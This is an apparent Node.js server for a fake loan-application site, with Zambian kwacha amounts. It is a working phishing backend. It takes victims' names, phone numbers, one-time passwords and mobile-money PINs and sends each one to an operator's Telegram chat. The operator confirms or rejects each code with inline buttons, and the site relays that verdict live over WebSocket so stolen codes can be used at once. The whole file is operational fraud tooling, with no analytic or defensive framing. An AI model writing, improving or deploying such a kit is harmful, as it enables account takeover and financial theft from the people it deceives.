const express = require('express');
const http = require('http');
const https = require('https');
const { WebSocketServer, WebSocket } = require('ws');

// ═══════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;   
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(express.static(__dirname));
app.use(express.json());

const sessions = {};

// ═══════════════════════════════════════════
// WEBSOCKET
// ═══════════════════════════════════════════
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost:' + PORT);
    const sessionId = url.searchParams.get('session');

    if (sessionId && sessions[sessionId]) {
        sessions[sessionId].ws = ws;
        console.log('WS connected:', sessions[sessionId].name, sessionId);
    }

    ws.on('close', () => {
        if (sessionId && sessions[sessionId]) {
            sessions[sessionId].ws = null;
            console.log('WS disconnected:', sessions[sessionId].name);
        }
    });
});

// ═══════════════════════════════════════════
// TELEGRAM HTTPS HELPER
// ═══════════════════════════════════════════
function tgRequest(method, path, body) {
    return new Promise((resolve, reject) => {
        const payload = body ? JSON.stringify(body) : null;
        const opts = { method, hostname: 'api.telegram.org', path };
        if (payload) {
            opts.headers = {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            };
        }
        const req = https.request(opts, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { resolve({ ok: false, raw: data }); }
            });
        });
        req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        if (payload) req.write(payload);
        req.end();
    });
}

function sendTelegram(text, buttons) {
    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', body)
        .then(res => {
            if (res.ok) console.log('TG sent');
            else console.error('TG error:', JSON.stringify(res));
        })
        .catch(err => console.error('Network:', err.message));
}

function answerCallback(cqId, text) {
    return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
        callback_query_id: cqId,
        text: text
    });
}

// ═══════════════════════════════════════════
// PAGE 1: Application
// ═══════════════════════════════════════════
app.post('/api/apply', async (req, res) => {
    const { name, phone, amount, period } = req.body;

    if (!name || !phone || !amount || !period) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    sessions[sessionId] = {
        ws: null,
        name, phone, amount, period,
        otp: '', pin: '',
        otpVerified: false, pinVerified: false
    };

    const msg = 'NEW LOAN APPLICATION\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Name: ' + name + '\n' +
        'Phone: ' + phone + '\n' +
        'Amount: K' + amount.toLocaleString() + '\n' +
        'Period: ' + period + ' days\n' +
        'Interest: K' + interest.toLocaleString() + '\n' +
        'Total Repay: K' + total.toLocaleString() + '\n' +
        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━';

    await sendTelegram(msg);
    res.json({ success: true, sessionId });
});

// ═══════════════════════════════════════════
// PAGE 2: OTP (4 digits, with admin buttons)
// ═══════════════════════════════════════════
app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = sessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.otp = otp;
    session.otpVerified = false;

    const msg = 'OTP SUBMITTED\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Name: ' + session.name + '\n' +
        'Phone: ' + session.phone + '\n' +
        'Amount: K' + session.amount.toLocaleString() + '\n' +
        'Period: ' + session.period + ' days\n' +
        'OTP: ' + otp + '\n' +
        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Tap to verify OTP';

    const buttons = [[
        { text: 'Correct OTP', callback_data: 'otp_correct:' + sessionId },
        { text: 'Wrong OTP', callback_data: 'otp_wrong:' + sessionId }
    ]];

    await sendTelegram(msg, buttons);
    res.json({ success: true, waiting: true });
});

// ═══════════════════════════════════════════
// PAGE 3: PIN (5 digits, with admin buttons)
// ═══════════════════════════════════════════
app.post('/api/pin', async (req, res) => {
    const { sessionId, pin } = req.body;
    const session = sessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.pin = pin;
    session.pinVerified = false;

    const msg = 'PIN SUBMITTED\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Name: ' + session.name + '\n' +
        'Phone: ' + session.phone + '\n' +
        'PIN: ' + pin + '\n' +
        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Tap to verify PIN';

    const buttons = [[
        { text: 'Correct PIN', callback_data: 'pin_correct:' + sessionId },
        { text: 'Wrong PIN', callback_data: 'pin_wrong:' + sessionId }
    ]];

    await sendTelegram(msg, buttons);
    res.json({ success: true, waiting: true });
});

// ═══════════════════════════════════════════
// TELEGRAM POLLING
// ═══════════════════════════════════════════
let offset = 0;

async function pollTelegram() {
    try {
        const data = await tgRequest('GET', '/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=0');

        if (data.ok) {
            for (const update of data.result) {
                offset = update.update_id + 1;

                if (update.callback_query) {
                    const cq = update.callback_query;
                    const parts = cq.data.split(':');
                    const action = parts[0] + '_' + parts[1];
                    const sessionId = parts.slice(2).join(':');
                    const session = sessions[sessionId];

                    if (!session) {
                        console.log('Unknown session:', sessionId);
                        continue;
                    }

                    await answerCallback(cq.id, 'Processing...');

                    // OTP VERIFICATION
                    if (action === 'otp_correct') {
                        session.otpVerified = true;
                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                            session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
                        }
                        await sendTelegram('OTP VERIFIED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nTime: ' + new Date().toLocaleString('en-ZM'));
                        console.log('OTP correct:', session.name);

                    } else if (action === 'otp_wrong') {
                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                            session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
                        }
                        await sendTelegram('OTP REJECTED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nUser asked to re-enter OTP\nTime: ' + new Date().toLocaleString('en-ZM'));
                        console.log('OTP wrong:', session.name);

                    // PIN VERIFICATION
                    } else if (action === 'pin_correct') {
                        session.pinVerified = true;
                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                            session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
                        }
                        await sendTelegram('PIN VERIFIED - APPLICATION COMPLETE\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nK' + session.amount.toLocaleString() + ' / ' + session.period + ' days\nTime: ' + new Date().toLocaleString('en-ZM'));
                        console.log('PIN correct:', session.name, 'COMPLETE');

                    } else if (action === 'pin_wrong') {
                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                            session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
                        }
                        await sendTelegram('PIN REJECTED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nUser asked to re-enter PIN\nTime: ' + new Date().toLocaleString('en-ZM'));
                        console.log('PIN wrong:', session.name);
                    }
                }
            }
        }
    } catch (err) {
        if (err.message !== 'timeout') console.error('Polling error:', err.message);
    }
    setTimeout(pollTelegram, 2000);
}

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
server.listen(PORT, () => {
    console.log('');
    console.log('Server running on port ' + PORT);
    console.log('WebSocket: /ws');
    console.log('Telegram polling started');
    console.log('');
    pollTelegram();
});   
